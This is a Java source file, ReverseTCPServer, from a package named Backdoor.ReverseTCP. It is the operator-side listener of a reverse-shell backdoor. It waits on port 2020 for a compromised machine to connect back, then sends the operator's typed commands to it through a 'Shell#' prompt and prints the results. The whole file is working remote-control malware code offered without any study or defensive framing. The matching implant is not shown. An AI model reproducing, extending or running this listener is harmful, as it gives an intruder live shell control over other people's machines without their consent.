package com.company.Backdoor.ReverseTCP;

import com.company.Backdoor.BackdoorConstants;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;
public class ReverseTCPServer
{
    private ServerSocket server;
    private Socket client;
    private int port;
    private PrintWriter writer;
    private DataInputStream dis;
    private BufferedReader reader;
    private Scanner scanner;


    public ReverseTCPServer(int port)
    {
        try
        {
            this.port = port;
            server = new ServerSocket(port);
            scanner = new Scanner(System.in);

        }
        catch (IOException e)
        {
            e.printStackTrace();
        }

    }

    public void connect()
    {
        try
        {
            System.out.println("Waiting connection...");
            client = server.accept();
            writer = new PrintWriter(client.getOutputStream());
            dis = new DataInputStream(client.getInputStream());
            reader = new BufferedReader(new InputStreamReader(dis));
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    private void readData()
    {
        try
        {
            String line;
            while ((line = reader.readLine()) != null)
            {
                if (line.endsWith(BackdoorConstants.END_OF_COMMAND))
                    break;
                System.out.println(line);
            }
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    public void run()
    {
        try
        {
            while (true)
            {
                System.out.print(BackdoorConstants.GREEN+"* Shell#%s~$: "+BackdoorConstants.RESET);
                String command = scanner.nextLine();
                writer.println(command);
                writer.flush();
                if (command.equals("exit"))
                    break;
                readData();
            }
            System.out.println("Connection Closed!");
            server.close();
            client.close();

        }
        catch (IOException e)
        {
            e.printStackTrace();
        }

    }












    public static void main(String[] args)
    {
        ReverseTCPServer server = new ReverseTCPServer(2020);
        server.connect();
        server.run();
    }
}
